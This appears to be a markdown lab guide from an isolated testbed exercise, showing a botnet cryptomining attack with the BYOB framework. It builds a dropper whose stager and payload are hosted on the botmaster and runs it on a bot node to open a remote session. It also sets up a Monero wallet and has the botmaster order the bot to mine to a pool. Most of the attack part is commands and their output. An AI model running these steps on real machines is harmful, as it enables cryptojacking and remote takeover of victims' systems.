## Mining Attack
Botmaster (`botmaster` in our case) uses bot nodes (`b1` in our case) to mine Monero cryptocurrency. 

### Connection with client

We will use the `botmaster` node to generate a client. The client will have a miner module built into it.

SSH to the botmaster node from your XDC
```shell
ssh botmaster
```

```shell
cd /opt/byob/byob.git/byob
python3 client.py --freeze botmaster.infra 1337 miner
```
The output should look like this:

```shell


88                                  88
88                                  88
88                                  88
88,dPPYba,  8b       d8  ,adPPYba,  88,dPPYba,
88P'    "8a `8b     d8' a8"     "8a 88P'    "8a
88       d8  `8b   d8'  8b       d8 88       d8
88b,   ,a8"   `8b,d8'   "8a,   ,a8" 88b,   ,a8"
8Y"Ybbd8"'      Y88'     `"YbbdP"'  8Y"Ybbd8"'
                d8'
               d8'


[>] Modules
        Adding modules...  -(5 modules added to client)

[>] Imports
        Adding imports...-(32 imports from 4 modules)

[>] Payload
        Uploading payload...  -(hosting payload at: http://botmaster.infra:1338/clients/payloads/jIJ.py)

[>] Stager
        Uploading stager... -(hosting stager at: http://botmaster.infra:1338/clients/stagers/jIJ.py)

[>] Dropper
        Writing dropper...  (355 bytes written to /modules/clients/droppers/byob_jIJ.py)
        Compiling executable...
91 INFO: PyInstaller: 6.4.0, contrib hooks: 2024.1
91 INFO: Python: 3.9.2
.
.
.
19652 INFO: Appending PKG archive to custom ELF section in EXE
19714 INFO: Building EXE from EXE-00.toc completed successfully.
(22,541,192 bytes saved to file: /opt/byob/byob/dist/jIJ)
```

We now scp this module to our home directory on the client (for example, `b1`):
```shell
scp dist/jIJ b1.infra:
```

Lastly, startup the server
```shell
python3 -u server.py
```
The server should start and should start a prompt as follows:

```shell
88                                  88
88                                  88
88                                  88
88,dPPYba,  8b       d8  ,adPPYba,  88,dPPYba,
88P'    "8a `8b     d8' a8"     "8a 88P'    "8a
88       d8  `8b   d8'  8b       d8 88       d8
88b,   ,a8"   `8b,d8'   "8a,   ,a8" 88b,   ,a8"
8Y"Ybbd8"'      Y88'     `"YbbdP"'  8Y"Ybbd8"'
                d8'
               d8'


[?]  Hint: show usage information with the 'help' command

[rishitsaiya @ /opt/byob/byob]>
```

Parallely, SSH to the b1 node from your XDC through different terminal
```shell
ssh b1
```
Execute the payload from here
```shell
./jIJ
```

At this point, the server should display a message like:
```shell
[+] Connection: 172.30.0.11
    Session: 0
    Started: Wed Nov  8 20:34:50 2023
```

Connect with the bot node using
```shell
shell 0
```
You can verify the socket connection by typing `ls` at prompt in server to check.

#### Monero Blockchain Synchronization
Before the actual mining starts, the blockchain consisting of Monero Ledger needs to be synchronized. This is of a significant size and can take hours to fetch onto our node. It is to be noted that the entire mining environment setup will be done on `b1` node, because it is the node which does the actual mining. The environment setup is done with these references - [Documentation](https://www.getmonero.org/resources/user-guides/verification-allos-advanced.html) & [Walkthrough Video](https://youtu.be/wMY_Sx3o26k?si=n3eNpRYwcr-rGTRC).


#### Synchronization on b1 node
On `b1` node where the CLI is setup, type the command:

```shell
rishitsaiya@b1:~$ cd monero-x86_64-linux-gnu-v0.18.3.1/
rishitsaiya@b1:~$ sudo ./monerod --data-dir=. --log-file=monero.log
```

It should look something like as follows:
```bash
2024-03-04 20:18:05.805 I Monero 'Fluorine Fermi' (v0.18.3.1-release)
2024-03-04 20:18:05.805 I Initializing cryptonote protocol...
2024-03-04 20:18:05.805 I Cryptonote protocol initialized OK
2024-03-04 20:18:05.806 I Initializing core...
2024-03-04 20:18:05.806 I Loading blockchain from folder ./lmdb ...
2024-03-04 20:18:05.932 I Loading checkpoints
2024-03-04 20:18:05.932 I Core initialized OK
2024-03-04 20:18:05.932 I Initializing p2p server...
2024-03-04 20:18:05.938 I p2p server initialized OK
2024-03-04 20:18:05.938 I Initializing core RPC server...
2024-03-04 20:18:05.938 I Binding on 127.0.0.1 (IPv4):18081
2024-03-04 20:18:05.939 I core RPC server initialized OK on port: 18081
2024-03-04 20:18:05.941 I Starting core RPC server...
2024-03-04 20:18:05.941 I core RPC server started ok
2024-03-04 20:18:05.941 I Starting p2p net loop...
2024-03-04 20:18:06.942 I 
2024-03-04 20:18:06.942 I **********************************************************************
2024-03-04 20:18:06.942 I The daemon will start synchronizing with the network. This may take a long time to complete.
2024-03-04 20:18:06.942 I 
2024-03-04 20:18:06.942 I You can set the level of process detailization through "set_log <level|categories>" command,
2024-03-04 20:18:06.942 I where <level> is between 0 (no details) and 4 (very verbose), or custom category based levels (eg, *:WARNING).
2024-03-04 20:18:06.942 I 
2024-03-04 20:18:06.942 I Use the "help" command to see the list of available commands.
2024-03-04 20:18:06.942 I Use "help <command>" to see a command's documentation.
2024-03-04 20:18:06.942 I **********************************************************************
.
.
.
2024-03-04 20:22:54.160 I 
2024-03-04 20:22:54.160 I **********************************************************************
2024-03-04 20:22:54.160 I You are now synchronized with the network. You may now start monero-wallet-cli.
2024-03-04 20:22:54.160 I 
2024-03-04 20:22:54.160 I Use the "help" command to see the list of available commands.
2024-03-04 20:22:54.160 I **********************************************************************
```
Note that it can take several hours. You can make this run in the background by adding `--detach` flag to the command mentioned above (not recommeded as you don't come to know about synchronization progress in real time and will have to navigate through the log for that.)

#### Monero Wallet Setup
After the synchronization is complete, the wallet is to be setup as follows:

```shell
rishitsaiya@b1:~/monero-x86_64-linux-gnu-v0.18.3.1$ ./monero-wallet-cli 
This is the command line monero wallet. It needs to connect to a monero
daemon to work correctly.
WARNING: Do not reuse your Monero keys on another fork, UNLESS this fork has key reuse mitigations built in. Doing so will harm your privacy.

Monero 'Fluorine Fermi' (v0.18.3.1-release)
Logging to ./monero-wallet-cli.log
Specify wallet file name (e.g., MyWallet). If the wallet doesn't exist, it will be created.
Wallet file name (or Ctrl-C to quit): discern
Wallet and key files found, loading...
Wallet password: 
```
After entering the password, the wallet prompt appears as follows:

```shell
Opened wallet: 42Mt2HmeN9SfMsMqidujg...u8D
**********************************************************************
Use the "help" command to see a simplified list of available commands.
Use "help all" to see the list of all available commands.
Use "help <command>" to see a command's documentation.
**********************************************************************
Starting refresh...
Refresh done, blocks received: 2973                             
Untagged accounts:
          Account               Balance      Unlocked balance                 Label
 *       0 42Mt2H        0.000000000000        0.000000000000       Primary account
------------------------------------------------------------------------------------
          Total          0.000000000000        0.000000000000
Currently selected account: [0] Primary account
Tag: (No tag assigned)
Balance: 0.000000000000, unlocked balance: 0.000000000000
Background refresh thread started
[wallet 42Mt2H]: address
0  42Mt2HmeN9SfMsMqidujg...u8D  Primary address 
```

The public address can be picked up from here. Other wallet commands can be used as refered in the [Monero Wallet Documentation](https://www.getmonero.org/resources/user-guides/monero-wallet-cli.html).

#### Joining a Mining Pool
Before the mining begins, you need to join a pool. For current demo, we have chosen [Hashvault Mining Pool](https://monero.hashvault.pro/en/getting-started).

#### Mining Instructions at the botmaster node
The mining can be made to start through the `botmaster` node with byob through the following command:

```shell
miner run pool.hashvault.pro 80 42Mt2HmeN9SfMsMqidujg...u8D
```
The mining starts here. The prompt on the botmaster node should look something like as follows:
```shell
[ 0 @ /home/rishitsaiya ]>miner run pool.hashvault.pro 80 42Mt2HmeN9SfMsMqidujg...u8D

Miner running in <Miner name='Miner-1' pid=30535 parent=30302 started>
```
**Note:** You may not see some monero accumulating immediately in your wallet balance, because it takes a lot of time to actually mine and collect these type of cryptocurrency. You can also join different pools to see if they can be used to mine currency quicker.

#### Appendix
There is a backup of the `lmdb/` on the XDC. `lmdb` is the monero transaction ledger database which acts as a database storage for the fetched blockchain up until when it was copied. It can be treated a backup recovery point and then can start synchronization again to avoid fetching the whole blockchain again. 

The command is used on **XDC** to mirror the image of database is as follows

```shell
rsync -a rishitsaiya@b1:/home/rishitsaiya monero-x86_64-linux-gnu-v0.18.3.1/lmdb /home/rishitsaiya/
```
The `lmdb` database can found at `/home/rishitsaiya/` location on XDC.